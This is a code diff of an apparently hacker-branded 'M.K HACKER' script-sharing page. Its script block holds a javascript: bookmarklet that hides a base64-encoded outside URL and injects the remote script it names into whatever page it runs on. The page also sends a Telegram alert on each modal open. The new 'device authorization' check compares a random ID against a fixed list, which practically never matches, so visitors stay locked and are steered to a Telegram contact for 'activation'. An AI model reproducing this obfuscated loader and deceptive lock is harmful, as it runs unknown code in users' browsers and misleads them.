@@ -336,6 +336,27 @@
             margin-bottom: 18px;
             letter-spacing: 1px;
         }
+        .clickable-warning {
+            display: block;
+            background: #080202;
+            border: 1.5px dashed var(--primary-red);
+            border-radius: 16px;
+            padding: 14px;
+            font-family: monospace;
+            font-size: 13px;
+            color: var(--primary-red);
+            font-weight: bold;
+            margin-bottom: 18px;
+            text-decoration: none;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 0 15px rgba(255, 30, 30, 0.3);
+        }
+        .clickable-warning:hover {
+            background: rgba(255, 30, 30, 0.1);
+            border-color: #ff5f56;
+            box-shadow: 0 0 25px rgba(255, 30, 30, 0.6);
+        }
         
         /* Toast Notification */
         #toast {
@@ -522,19 +543,25 @@
         </div>
     </div>
 
-    <!-- Access Locked Modal -->
+    <!-- Access Locked / Status Modal -->
     <div class="modal" id="accessModal">
         <div class="modal-content">
             <div class="modal-logo">
                 <img src="https://i.postimg.cc/t4NvM0jw/file-00000000fac08211ae44783af21c9e4f.png" alt="M.K">
             </div>
             <div class="modal-brand-title">😈☠️ 𝗠.𝗞 𝗛𝗔𝗖𝗞𝗘𝗥 ☠️😈</div>
-            <h3 style="color: #ff1e1e;">ACCESS LOCKED</h3>
-            <p class="modal-desc">Your device is not authorized.</p>
             
-            <div class="access-box" id="deviceIdBox">9056670944235380564</div>
-            
-            <p style="margin-bottom: 15px; font-weight: bold;">Telegram: <a href="https://t.me/MK_HACKER586" target="_blank" style="color: #ff1e1e; text-decoration: none;">@MK_HACKER586</a></p>
+            <div id="modalHeaderContent">
+                <h3 style="color: #ff1e1e;" id="modalTitle">ACCESS LOCKED ❌</h3>
+                <p class="modal-desc" id="modalDesc">Your device is not authorized yet.</p>
+                
+                <div class="access-box" id="deviceIdBox">9056670944235380564</div>
+                
+                <!-- Clickable warning box leading directly to Telegram -->
+                <a href="https://t.me/MK_HACKER586" target="_blank" class="clickable-warning" id="warningBoxLink">
+                    ⚠️ CONTACT @MK_HACKER586 FOR ACTIVATION
+                </a>
+            </div>
             
             <button class="action-main-btn" onclick="retryAccess()">RETRY 🔄</button>
             
@@ -557,11 +584,21 @@
     <div id="toast">COPIED SUCCESSFULLY ✓</div>
 
     <script>
+        // Yahan aap apni authorized device IDs daal sakte hain jo database ka kaam karega
+        const authorizedDevices = [
+            "1234567890123456789",
+            "9876543210987654321"
+            // Apni ya kisi authorized user ki ID yahan add karein
+        ];
+
         const scriptCodes = {
             'script1': "javascript:(()=>{if(document.getElementById('__mkh_loader__'))return;const d=document,b=d.body,l=d.createElement('div');l.id='__mkh_loader__';l.style='position:fixed;inset:0;background:rgba(0,0,0,0.88);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:999999;font-family:sans-serif;backdrop-filter:blur(5px);';const c=d.createElement('div');c.style='width:65px;height:65px;border:6px solid rgba(255,30,30,0.2);border-top:6px solid #ff1e1e;border-radius:50%;animation:s .4s linear infinite';d.head.appendChild(Object.assign(d.createElement('style'),{textContent:'@keyframes s{to{transform:rotate(360deg)}}'}));const t=d.createElement('div');t.style='color:#ff1e1e;font-weight:900;margin-top:15px;font-size:14px;letter-spacing:1px;text-shadow:0 0 15px rgba(255,30,30,0.8);';t.innerHTML='😈☠️ <b>𝗠.𝗞 𝗛𝗔𝗖𝗞𝗘𝗥 𝗟𝗢𝗔𝗗𝗜𝗡𝗚...</b>';l.appendChild(c);l.appendChild(t);b.appendChild(l);const s=d.createElement('script');s.src=`${atob('aHR0cHM6Ly9ta2hhY2tlcnByb3NjcmlwdHMudmVyY2VsLmFwcC9nZXRxeC5qcw==')}?v=${Date.now()}`;s.onload=()=>l.remove();s.onerror=()=>{l.remove();};b.appendChild(s)})();",
             'script8': "javascript:(()=>{location.reload();})();",
             'script9': "javascript:(()=>{location.reload();})();"
         };
+
+        // Current generated device ID for session visitor
+        let currentDeviceId = "";
 
         function openCodeModal(scriptName, scriptKey) {
             sendTelegramAlert(scriptName);
@@ -576,10 +613,40 @@
         }
 
         function openAccessModal(scriptName) {
-            sendTelegramAlert(scriptName + " (Access Locked)");
-            const randomId = Math.floor(1000000000000000000 + Math.random() * 9000000000000000000);
-            document.getElementById('deviceIdBox').innerText = randomId;
+            sendTelegramAlert(scriptName + " (Access Check)");
+            currentDeviceId = Math.floor(1000000000000000000 + Math.random() * 9000000000000000000).toString();
+            updateModalUI(currentDeviceId);
             document.getElementById('accessModal').style.display = 'flex';
+        }
+
+        function updateModalUI(deviceId) {
+            const titleEl = document.getElementById('modalTitle');
+            const descEl = document.getElementById('modalDesc');
+            const deviceBoxEl = document.getElementById('deviceIdBox');
+            const warningBoxLink = document.getElementById('warningBoxLink');
+            
+            deviceBoxEl.innerText = deviceId;
+
+            // Check if device is authorized in our list
+            if (authorizedDevices.includes(deviceId)) {
+                titleEl.style.color = "#00ff66";
+                titleEl.innerText = "ACCESS GRANTED ✓";
+                descEl.innerText = "Your device is successfully authorized!";
+                warningBoxLink.style.borderColor = "#00ff66";
+                warningBoxLink.style.color = "#00ff66";
+                warningBoxLink.style.boxShadow = "0 0 15px rgba(0, 255, 102, 0.3)";
+                warningBoxLink.innerHTML = "🎉 ENJOY & UNLOCKED SUCCESSFULLY!";
+                warningBoxLink.href = "https://t.me/MK_HACKER586";
+            } else {
+                titleEl.style.color = "#ff1e1e";
+                titleEl.innerText = "ACCESS LOCKED ❌";
+                descEl.innerText = "Your device is not authorized yet.";
+                warningBoxLink.style.borderColor = "#ff1e1e";
+                warningBoxLink.style.color = "#ff1e1e";
+                warningBoxLink.style.boxShadow = "0 0 15px rgba(255, 30, 30, 0.3)";
+                warningBoxLink.innerHTML = "⚠️ CONTACT @MK_HACKER586 FOR ACTIVATION";
+                warningBoxLink.href = "https://t.me/MK_HACKER586";
+            }
         }
 
         function closeModals() {
@@ -593,9 +660,9 @@
             
             setTimeout(() => {
                 overlay.style.display = 'none';
-                const randomId = Math.floor(1000000000000000000 + Math.random() * 9000000000000000000);
-                document.getElementById('deviceIdBox').innerText = randomId;
-                // Yahan hamesha ACCESS LOCKED hi rahega jab tak real database check na lagaya jaye
+                // Agar aap chahein toh test karne ke liye yahan naya ID generate hoga aur check hoga
+                currentDeviceId = Math.floor(1000000000000000000 + Math.random() * 9000000000000000000).toString();
+                updateModalUI(currentDeviceId);
                 document.getElementById('accessModal').style.display = 'flex';
             }, 1200);
         }
